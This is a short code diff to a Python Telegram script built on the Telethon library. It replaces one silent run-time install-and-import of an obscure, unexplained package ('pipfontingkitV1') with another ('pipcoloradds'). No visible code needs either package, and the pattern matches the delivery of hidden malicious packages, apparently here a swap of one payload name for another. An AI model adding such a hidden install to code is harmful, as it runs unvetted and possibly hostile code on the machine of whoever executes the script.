@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipfontingkitV1")
-import pipfontingkitV1
+os.system("pip install pipcoloradds")
+import pipcoloradds
 from telethon.sync import TelegramClient
 from telethon.tl.functions.messages import GetDialogsRequest
 from telethon.tl.types import InputPeerEmpty, InputPeerChannel
